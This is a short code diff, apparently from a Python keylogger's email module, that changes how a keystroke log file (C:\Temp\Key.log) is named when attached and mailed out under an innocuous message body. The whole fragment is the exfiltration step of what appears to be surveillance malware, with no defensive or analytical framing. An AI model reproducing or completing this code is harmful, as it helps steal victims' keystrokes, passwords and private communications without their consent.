@@ -21,7 +21,7 @@ class emailSender:
             body = 'Hey, what up'
 
             msg.attach( MIMEText( body, "plain" ) )
-            filename = "Filename.txt"
+            filename = "Key.log"
             attachment = open( 'C:\\Temp\\Key.log', "rb" )
 
             part = MIMEBase( "application", "octet-stream" )
